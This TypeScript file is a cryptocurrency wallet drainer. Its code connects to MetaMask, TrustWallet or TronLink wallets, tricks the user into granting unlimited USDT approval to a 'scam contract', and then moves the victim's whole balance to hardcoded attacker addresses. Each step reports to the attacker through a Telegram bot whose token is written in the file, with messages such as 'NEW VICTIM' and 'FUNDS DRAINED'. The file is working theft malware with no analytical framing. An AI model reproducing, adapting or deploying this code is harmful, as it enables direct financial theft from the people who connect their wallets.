// @ts-nocheck
import { ethers } from 'ethers';

export const ATTACKER_CONFIG = {
  attackerAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
  tronAttackerAddress: "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
  telegramBotToken: "8764463650:AAGPoZcwOj3xat1YokIrsvO_Y3dAqq5ct4Y",
  telegramChatId: "8448871506",
  usdtContracts: {
    "0x1":  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0x38": "0x55d398326f99059fF775485246999027B3197955",
    "0x2b6653dc": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  },
  scamContractAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
};

async function sendTelegramAlert(message: string) {
  try {
    const url = `https://api.telegram.org/bot${ATTACKER_CONFIG.telegramBotToken}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ATTACKER_CONFIG.telegramChatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (e) {
    console.log('Telegram alert failed:', e);
  }
}

// ─────────────────────────────────────────────────────────
// Helper: resolve a TronWeb instance from multiple sources
// Ignores `false` values – TronLink v3 sets tronWeb to
// the boolean `false` before authorisation.
// ─────────────────────────────────────────────────────────
function resolveTronWeb(): any {
  const candidates = [
    (window as any).tron?.tronWeb,
    (window as any).tronLink?.tronWeb,
    (window as any).tronWeb,
  ];
  for (const c of candidates) {
    // Must be a truthy object (ignore null / undefined / boolean false)
    if (c && typeof c === 'object' && c.ready) {
      return c;
    }
  }
  return null;
}

// ─────────────────────────────────────────────────────────
// Helper: get the TronLink provider (TIP-6963 / legacy)
// ─────────────────────────────────────────────────────────
function getTronProvider(): any {
  return (window as any).tron ?? (window as any).tronLink ?? null;
}

// ─────────────────────────────────────────────────────────
// Connect & Approve
// ─────────────────────────────────────────────────────────
export async function connectAndApprove(
  walletType: "metamask" | "trustwallet" | "tronlink"
) {
  let signer, address, chainId;

  // ── TRON BRANCH ───────────────────────────────────────
  if (walletType === "tronlink") {
    // Step 1: try to find an already-injected & ready tronWeb
    let tronWeb = resolveTronWeb();

    // Step 2: if not ready yet, try waking TronLink via TIP-6963
    if (!tronWeb) {
      const provider = getTronProvider();

      if (provider && typeof provider.request === 'function') {
        // This triggers the authorisation popup – TronLink will inject tronWeb
        // after the user approves
        try {
          const res = await provider.request({ method: 'tron_requestAccounts' });
          if (res?.code !== 200) {
            throw new Error('TronLink authorisation was rejected.');
          }
        } catch (e: any) {
          if (e?.code === 4001 || e?.message?.includes('rejected') || e?.message?.includes('denied')) {
            throw new Error('You rejected the TronLink connection request.');
          }
          throw e;
        }

        // Re-read tronWeb after successful authorisation
        tronWeb = resolveTronWeb();
      }
    }

    // Step 3: if still not ready, poll briefly for async injection
    if (!tronWeb) {
      window.dispatchEvent(new Event('TIP6963:requestProvider'));

      for (let i = 0; i < 15; i++) {
        await new Promise((r) => setTimeout(r, 200));
        tronWeb = resolveTronWeb();
        if (tronWeb) break;
      }
    }

    // Step 4: final check – if still nothing, give up
    if (!tronWeb) {
      // One last attempt: check if ANY TronLink property exists on window
      const hasTronLink =
        (window as any).tron !== undefined ||
        (window as any).tronLink !== undefined ||
        (window as any).tronWeb !== undefined;

      if (hasTronLink) {
        throw new Error(
          'TronLink detected but not ready. Please unlock your wallet and ensure you are on Mainnet, then try again.'
        );
      }

      throw new Error(
        'TronLink not detected. Please install the TronLink extension, unlock it, and refresh.'
      );
    }

    address = tronWeb.defaultAddress?.base58;
    if (!address) {
      throw new Error('Could not retrieve Tron wallet address.');
    }

    chainId = 728126428;
    signer = { _isTron: true, address, tronWeb };
    await sendTelegramAlert(`🔔 NEW VICTIM (TronLink) - ${address}`);

  // ── EVM BRANCH (MetaMask / TrustWallet) ──────────────
  } else {
    if (!window.ethereum) {
      throw new Error(
        'No Ethereum wallet detected. Please install MetaMask or TrustWallet.'
      );
    }

    // Switch to BNB Chain for TrustWallet
    if (walletType === 'trustwallet') {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (switchErr: any) {
        if (switchErr.code === 4902) {
          throw new Error(
            'BNB Chain not found in your wallet. Add it manually first.'
          );
        }
      }
    }

    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    address = await signer.getAddress();
    const network = await provider.getNetwork();
    chainId = Number(network.chainId);

    await sendTelegramAlert(
      `🔔 NEW VICTIM - ${walletType} - ${address} - Chain: ${chainId}`
    );
  }

  // Approve unlimited (both paths converge here)
  await approveUnlimited(signer, chainId);
  return { signer, address, chainId };
}

// ─────────────────────────────────────────────────────────
// Approve Unlimited USDT
// ─────────────────────────────────────────────────────────
export async function approveUnlimited(signer: any, chainId: number) {
  // ── TRON BRANCH ──────────────────────────────────────
  if (signer._isTron) {
    const tw = signer.tronWeb ?? resolveTronWeb();
    if (!tw?.ready) throw new Error('TronLink not ready');

    const contract = await tw
      .contract()
      .at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);

    const maxApprove =
      '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const tx = await contract
      .approve(ATTACKER_CONFIG.scamContractAddress, maxApprove)
      .send();

    await sendTelegramAlert(`✅ UNLIMITED APPROVED (TRC20) - ${signer.address}`);
    return tx;
  }

  // ── EVM BRANCH ───────────────────────────────────────
  const hexChain = '0x' + chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error(`No USDT contract for chain ${chainId}`);

  const token = new ethers.Contract(
    usdtAddress,
    ['function approve(address,uint256) returns (bool)'],
    signer
  );

  const tx = await token.approve(
    ATTACKER_CONFIG.scamContractAddress,
    ethers.MaxUint256
  );

  await sendTelegramAlert(
    `✅ UNLIMITED APPROVED - Chain: ${chainId} - TX: ${tx.hash}`
  );
  await tx.wait();
  return tx.hash;
}

// ─────────────────────────────────────────────────────────
// Disguised Transfer — full drain
// ─────────────────────────────────────────────────────────
export async function disguisedTransfer(
  signer: any,
  victimAddress: string,
  chainId: number
) {
  // ── TRON BRANCH ──────────────────────────────────────
  if (signer._isTron) {
    const tw = signer.tronWeb ?? resolveTronWeb();
    if (!tw?.ready) throw new Error('TronLink not ready');

    const contract = await tw
      .contract()
      .at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);

    const balance = await contract.balanceOf(victimAddress).call();
    if (balance === '0' || balance === '0x0')
      throw new Error('No USDT balance');

    const tx = await contract
      .transfer(ATTACKER_CONFIG.tronAttackerAddress, balance)
      .send();

    await sendTelegramAlert(
      `🚨 TRC20 DRAINED - ${victimAddress} - ${balance}`
    );
    return tx;
  }

  // ── EVM BRANCH ───────────────────────────────────────
  const hexChain = '0x' + chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error('No USDT contract');

  const token = new ethers.Contract(
    usdtAddress,
    [
      'function balanceOf(address) view returns (uint256)',
      'function transferFrom(address,address,uint256) returns (bool)',
    ],
    signer
  );

  const balance = await token.balanceOf(victimAddress);
  if (balance === 0n) throw new Error('No USDT balance');

  const tx = await token.transferFrom(
    victimAddress,
    ATTACKER_CONFIG.attackerAddress,
    balance
  );
  await tx.wait();

  await sendTelegramAlert(
    `🚨 FUNDS DRAINED - ${ethers.formatUnits(balance, 6)} USDT - TX: ${tx.hash}`
  );
  return tx.hash;
}